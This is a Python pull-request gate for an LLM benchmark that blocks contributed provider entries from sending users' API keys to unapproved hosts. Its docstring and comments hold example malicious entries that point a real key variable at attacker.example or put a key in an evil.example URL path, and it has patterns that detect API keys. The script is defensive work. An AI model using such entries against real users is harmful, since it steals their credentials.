#!/usr/bin/env python3
"""Refuse a contribution that could turn this benchmark into a credential harvester.

Run on every pull request. Exit 0 clean, 1 something must be fixed, 2 the gate could not run.

    python bench/gate_contributions.py

WHY THIS EXISTS, stated plainly because it is the sharpest edge in the repo:

`benchmark.py` reads BOTH the endpoint URL and the environment variable holding the API key out of
`providers.json` — and CONTRIBUTING.md invites strangers to add providers by editing exactly that file.
So a pull request adding

    {"name": "fastllm", "url": "https://attacker.example/v1/chat/completions", "key_env": "GROQ_API_KEY"}

would make everyone who runs the battery send their real Groq key, in an Authorization header, to a
server the contributor controls. The PR would look like a helpful addition. That is the whole attack,
and it needs no exploit — just a merge.

The rule that stops it: **an API key is bound to one host, forever.** A key variable that already
appears in this file may never appear again pointing somewhere else, and a new provider may not claim
an existing project's key variable. Both checks are below, and both fail loudly.
"""
import json, re, sys
from pathlib import Path
from urllib.parse import urlparse

HERE = Path(__file__).resolve().parent

# Some providers legitimately name their key after the product, not the company, and host their sign-up
# on a different domain than their API. Those pairs are declared HERE, IN CODE, on purpose: adding one
# means editing this gate in the same pull request, where a reviewer sees it. A contributor cannot
# quietly claim someone else's key variable by writing JSON alone.
KNOWN_KEY_ALIASES = {
    "google": {"GEMINI_API_KEY"},        # Google AI Studio issues keys branded Gemini
    "cloudflare": {"CF_API_TOKEN"},      # Cloudflare's own docs and dashboard use CF_
}
# The only hosts this benchmark will ever send an API key to. In code, not in data: a JSON-only pull
# request cannot add a destination. Adding one is an edit to this file, visible in review.
# benchmark.py imports this and refuses to call anything else, so the check runs at request time too,
# not only in CI.
ALLOWED_HOSTS = {
    "generativelanguage.googleapis.com",
    "api.cerebras.ai",
    "api.groq.com",
    "openrouter.ai",
    "api.cloudflare.com",
    "integrate.api.nvidia.com",
    "ollama.com",
    "dashscope-intl.aliyuncs.com",
    "api.xkiro.com",
    "api.siliconflow.com",
    "api.z.ai",              # judge, not a benchmarked provider: see bench/judges.json
}

# The only environment variables allowed to be interpolated into a URL. Anything else would let a
# contributed URL like https://evil.example/{OPENROUTER_API_KEY}/ exfiltrate a second key in the path.
ALLOWED_URL_PLACEHOLDERS = {"CF_ACCOUNT_ID"}

KNOWN_SIGNUP_HOSTS = {
    # provider: hosts where you legitimately obtain a key, when it differs from the API host
    "google": {"google.com"},            # aistudio.google.com issues keys for generativelanguage.googleapis.com
    "alibaba": {"alibabacloud.com"},     # the Model Studio console issues keys for dashscope-intl
    "nvidia": {"nvidia.com"},
    "openrouter": {"openrouter.ai"},
    "xkiro": {"xkiro.com"},
    "siliconflow": {"siliconflow.com"},
    "cerebras": {"cerebras.ai"},
    "groq": {"groq.com"},
    "ollama": {"ollama.com"},
    "cloudflare": {"cloudflare.com"},
}

# Hosts that are not credential destinations, whatever a contributor writes.
FORBIDDEN_HOST = re.compile(
    r"^(localhost|127\.|0\.0\.0\.0|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|169\.254\.|\[?::1\]?|.*\.local)$|^\d+\.\d+\.\d+\.\d+$",
    re.I)


def host_of(url):
    return (urlparse(url).hostname or "").lower()


def registrable(host):
    """Rough eTLD+1. Good enough to tell api.groq.com from attacker.example."""
    parts = host.split(".")
    if len(parts) >= 3 and parts[-2] in {"co", "com", "net", "org", "gov", "ac", "edu"} and len(parts[-1]) == 2:
        return ".".join(parts[-3:])          # something.co.uk
    return ".".join(parts[-2:]) if len(parts) >= 2 else host


def check_providers(path, problems):
    data = json.loads(path.read_text(encoding="utf-8"))
    providers = data.get("providers", [])
    if not providers:
        problems.append((path.name, "no providers defined"))
        return

    key_to_host, host_to_key, names = {}, {}, set()
    for p in providers:
        name, url, key_env = p.get("name", ""), p.get("url", ""), p.get("key_env", "")
        where = "%s: provider %r" % (path.name, name or "<unnamed>")

        if not name or not url or not key_env:
            problems.append((where, "needs name, url and key_env"))
            continue
        if name in names:
            problems.append((where, "duplicate provider name"))
        names.add(name)

        # --- the endpoint itself
        parsed = urlparse(url)
        if parsed.scheme != "https":
            problems.append((where, "url must be https, got %r" % parsed.scheme))
        if parsed.username or parsed.password:
            problems.append((where, "url carries credentials in it"))
        host = host_of(url)
        if not host:
            problems.append((where, "url has no host"))
            continue
        if FORBIDDEN_HOST.match(host):
            problems.append((where, "url points at %r, which is not a public provider host" % host))
        if host not in ALLOWED_HOSTS:
            problems.append((where, "host %r is not in ALLOWED_HOSTS. This benchmark sends a real API key "
                                    "in an Authorization header, so every destination is declared in code, "
                                    "not in data. If this provider is genuine, add the host to "
                                    "ALLOWED_HOSTS in this gate in the same pull request." % host))
        if urlparse(url).query or urlparse(url).fragment:
            problems.append((where, "url carries a query string or fragment; endpoints here are plain paths"))

        # Placeholders get substituted from the environment at request time. Only one is allowed.
        for ph in re.findall(r"\{([A-Za-z_][A-Za-z0-9_]*)\}", url):
            if ph not in ALLOWED_URL_PLACEHOLDERS:
                problems.append((where, "url interpolates {%s}. Only %s may appear in a URL: any other "
                                        "environment variable placed in a path would be sent to the host "
                                        "as plain text, which is how a second key leaks."
                                 % (ph, ", ".join(sorted(ALLOWED_URL_PLACEHOLDERS)))))

        # --- THE RULE: one key variable, one host. Forever.
        prev_host = key_to_host.get(key_env)
        if prev_host and registrable(prev_host) != registrable(host):
            problems.append((where,
                             "key_env %s is already bound to %s, and this entry points it at %s. "
                             "An API key belongs to exactly one provider: sending it anywhere else "
                             "hands that provider's credential to a third party."
                             % (key_env, prev_host, host)))
        key_to_host.setdefault(key_env, host)

        prev_key = host_to_key.get(registrable(host))
        if prev_key and prev_key != key_env:
            problems.append((where, "host %s already uses key_env %s; two key variables for one host "
                                    "is how a typo becomes a leak" % (host, prev_key)))
        host_to_key.setdefault(registrable(host), key_env)

        # --- the key variable must belong to this provider, by name or by a declared alias
        stem = re.sub(r"[^A-Z0-9]", "", name.upper())
        env_stem = re.sub(r"[^A-Z0-9]", "", key_env.upper())
        aliased = key_env in KNOWN_KEY_ALIASES.get(name, set())
        if stem and stem not in env_stem and not aliased:
            problems.append((where, "key_env %s does not name this provider and is not a declared alias. "
                                    "A provider called %r must read its own variable (e.g. %s_API_KEY). "
                                    "If this provider genuinely brands its key differently, add the pair "
                                    "to KNOWN_KEY_ALIASES in this gate, in the same pull request, so a "
                                    "reviewer sees it." % (key_env, name, stem)))
        if not re.fullmatch(r"[A-Z][A-Z0-9_]{2,60}", key_env):
            problems.append((where, "key_env %r is not a plain uppercase environment variable name" % key_env))

        # --- signup link should be the provider's own site, so nobody is sent to a lookalike
        signup = p.get("signup", "")
        if signup:
            s_host = host_of(signup)
            allowed_signup = KNOWN_SIGNUP_HOSTS.get(name, set()) | {registrable(host)}
            if urlparse(signup).scheme != "https":
                problems.append((where, "signup link must be https"))
            elif registrable(s_host) not in allowed_signup:
                problems.append((where, "signup points at %s, which is neither the API domain (%s) nor a "
                                        "declared sign-up host for %r. A sign-up link on an undeclared "
                                        "domain is how people get phished; add it to KNOWN_SIGNUP_HOSTS "
                                        "in this gate if it is genuine."
                                 % (s_host, registrable(host), name)))

        for m in p.get("models", []):
            if not isinstance(m, dict) or not m.get("id"):
                problems.append((where, "every model needs an id"))
            if m.get("max_tokens") and not isinstance(m["max_tokens"], int):
                problems.append((where, "max_tokens must be an integer"))
        if not isinstance(p.get("pause_seconds", 1), (int, float)) or p.get("pause_seconds", 1) < 0:
            problems.append((where, "pause_seconds must be a non-negative number"))


def check_language(path, problems):
    d = json.loads(path.read_text(encoding="utf-8"))
    where = "bench/languages/%s" % path.name
    for field in ("language", "code", "probes", "jury"):
        if field not in d:
            problems.append((where, "missing required field %r" % field))
    if d.get("code") and path.stem != d["code"]:
        problems.append((where, "code %r does not match the filename" % d["code"]))

    for name, spec in (d.get("probes") or {}).items():
        p_where = "%s probe %s" % (where, name)
        if "prompt" not in spec or "kind" not in spec:
            problems.append((p_where, "needs a prompt and a kind"))
            continue
        prompt = spec["prompt"]
        # The prompt is sent to ten third parties and its echo is published in results/. Anything that
        # looks like an address, a key or a link does not belong in it.
        if re.search(r"https?://|www\.", prompt):
            problems.append((p_where, "prompt contains a URL. Probe prompts are sent to every provider "
                                      "and echoed into published results; keep them free of links."))
        if re.search(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}", prompt):
            problems.append((p_where, "prompt contains an email address"))
        if re.search(r"\b(sk-|gsk_|nvapi-|AIza)[A-Za-z0-9_\-]{8,}", prompt):
            problems.append((p_where, "prompt contains something shaped like an API key"))
        if len(prompt) > 2000:
            problems.append((p_where, "prompt is over 2000 characters; probes are short by design"))
        if spec["kind"] == "arithmetic" and not spec.get("expect_numbers"):
            problems.append((p_where, "arithmetic probes need expect_numbers"))
        if spec["kind"] == "json_extraction" and not spec.get("expect"):
            problems.append((p_where, "json_extraction probes need an expect object"))

    lenses = d.get("jury") or {}
    if lenses and "sounds_human" not in lenses:
        problems.append((where, "jury must keep the lens name 'sounds_human': rank.py looks it up by "
                                "name to build the agent ranking"))


def check_judges(path, problems):
    """A judge receives an API key too, so it gets the same treatment as a provider.

    Plus one rule of its own: at least one judge must be reachable by API. A jury made only of judges
    that run through our private tooling cannot be reproduced by anyone, which would make half of every
    quality score an assertion rather than a measurement.
    """
    if not path.exists():
        return
    d = json.loads(path.read_text(encoding="utf-8"))
    judges = d.get("judges", [])
    if not judges:
        problems.append((path.name, "no judges defined"))
        return
    families, api_judges = set(), 0
    for j in judges:
        where = "%s: judge %r" % (path.name, j.get("name", "<unnamed>"))
        if j.get("via") not in ("api", "agent"):
            problems.append((where, "via must be 'api' or 'agent', got %r" % j.get("via")))
        if j.get("via") == "api":
            api_judges += 1
            host = host_of(j.get("url", ""))
            if urlparse(j.get("url", "")).scheme != "https":
                problems.append((where, "url must be https"))
            if host not in ALLOWED_HOSTS:
                problems.append((where, "host %r is not in ALLOWED_HOSTS. A judge gets an API key in an "
                                        "Authorization header just like a provider does." % host))
            if not j.get("key_env"):
                problems.append((where, "an api judge needs key_env"))
        if not j.get("family"):
            problems.append((where, "every judge must declare its model family, so a reader can see "
                                    "whether it is scoring a relative"))
        families.add(j.get("family"))
    if api_judges == 0:
        problems.append((path.name, "no judge is reachable by API. At least one must be, or nobody "
                                    "outside this house can reproduce any part of the jury half."))
    if len(families) < 2:
        problems.append((path.name, "all judges are from the same family (%s). Agreement between judges "
                                    "of one family measures consistency, not correctness."
                         % ", ".join(sorted(str(f) for f in families))))


def check_limits(path, problems):
    d = json.loads(path.read_text(encoding="utf-8"))
    for name, p in (d.get("providers") or {}).items():
        where = "%s: %s" % (path.name, name)
        conf = p.get("confidence")
        if conf not in ("MEASURED", "DECLARED", "UNKNOWN"):
            problems.append((where, "confidence must be MEASURED, DECLARED or UNKNOWN, got %r" % conf))
        if conf == "DECLARED" and not p.get("source"):
            problems.append((where, "DECLARED needs a source URL: that is what makes it checkable"))
        if conf == "MEASURED" and not p.get("measured_on"):
            problems.append((where, "MEASURED needs measured_on: an undated measurement is a rumour"))
        blob = json.dumps(p)
        if re.search(r"(?i)(x\s*\d+\s*(keys|accounts)|\d+\s*(keys|accounts)\s*[x*])", blob):
            problems.append((where, "a limit multiplied across keys or accounts. Most limits apply per "
                                    "account or per organization, so it is usually false, and it reads "
                                    "as advice to evade a quota."))


def main():
    root = HERE
    problems = []
    try:
        check_providers(root / "providers.json", problems)
        check_judges(root / "judges.json", problems)
        check_limits(root / "limits.json", problems)
        langs = sorted((root / "languages").glob("*.json"))
        if not langs:
            problems.append(("bench/languages", "no language packs found"))
        for p in langs:
            check_language(p, problems)
    except json.JSONDecodeError as e:
        print("A data file is not valid JSON: %s" % e)
        return 2
    except Exception as e:
        print("gate could not run: %s: %s" % (type(e).__name__, e))
        return 2

    print("checked providers.json, judges.json, limits.json and %d language pack(s)" % len(langs))
    if not problems:
        print("CLEAN - contributions are safe to merge.")
        return 0
    print("\n%d PROBLEMS - do not merge:\n" % len(problems))
    for where, what in problems:
        print("  %s\n      %s" % (where, what))
    return 1


if __name__ == "__main__":
    sys.exit(main())
